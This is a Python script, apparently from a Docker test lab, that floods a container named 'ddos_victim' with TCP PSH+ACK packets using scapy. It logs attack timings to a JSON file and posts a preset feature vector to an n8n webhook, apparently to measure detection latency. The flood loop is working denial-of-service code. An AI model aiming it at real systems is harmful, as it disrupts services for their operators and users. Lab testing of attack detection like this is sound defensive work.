import threading
import time
import requests
import uuid
import json
import os
from scapy.all import IP, TCP, send

N8N_URL = "http://n8n:5678/webhook-test/traffic"
LOG_FILE = "/app/logs/ddos_pshack_test.json"
VICTIM_IP = "ddos_victim"
VICTIM_PORT = 5050

features = {
    "Header_Length": 20.0, "Time_To_Live": 64.0, "Rate": 36494.42, 
    "fin_flag_number": 0.0, "syn_flag_number": 0.0, "rst_flag_number": 0.0, 
    "psh_flag_number": 1.0, "ack_flag_number": 1.0, "ece_flag_number": 0.0, 
    "cwr_flag_number": 0.0, "ack_count": 100, "syn_count": 0, "fin_count": 0, 
    "rst_count": 0, "HTTP": 0.0, "HTTPS": 0.0, "DNS": 0.0, "Telnet": 0.0, 
    "SMTP": 0.0, "SSH": 0.0, "IRC": 0.0, "TCP": 1.0, "UDP": 0.0, "DHCP": 0.0, 
    "ARP": 0.0, "ICMP": 0.0, "IGMP": 0.0, "IPv": 1.0, "Tot sum": 6000.0, 
    "Min": 60.0, "Max": 60.0, "AVG": 60.0, "Std": 0.0, "Tot size": 60.0, 
    "IAT": 0.0000274, "Number": 100.0
}

def write_t0_log(attack_id, t0):
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    
    entry = {
        "attack_id": attack_id,
        "attacco": "DDOS-PSHACK_FLOOD",
        "T0": t0,
        "T1": None,
        "T2": None,
        "T3": None,
        "successo": False
    }

    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                data = []
    else:
        data = []
        
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=4)
        

def flood_thread(stop_event):                   #Stop event serve per interrompere l'invio dei pkt con CTR+C
    print("Inizio Invio Pacchetti", flush=True)
    pkt = IP(dst=VICTIM_IP)/TCP(dport=VICTIM_PORT, flags="PA")/"DDoS_TEST_DATA"
    while not stop_event.is_set():
        send(pkt, verbose=False)
        

if __name__ == '__main__':
    attack_id = str(uuid.uuid4())
    
    stop_event = threading.Event()
    t = threading.Thread(target=flood_thread, args=(stop_event,))
    t.start()
    
    t0 = time.time()  
    threading.Thread( 
        target=write_t0_log,
        args=(attack_id, t0),
        daemon=True
    ).start()
    
    try:
        payload = {"attack_id": attack_id, "features": features}
        response = requests.post(N8N_URL, json=payload)
        
        print(f"Status n8n: {response.status_code}")
    except Exception as e:
        print(f"Errore n8n: {e}")
        stop_event.set()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Arresto in corso")
        stop_event.set()
        t.join()
        


#Avvio --> docker-compose run --rm sender 
#Avvio con modifiche --> docker-compose run --rm --build sender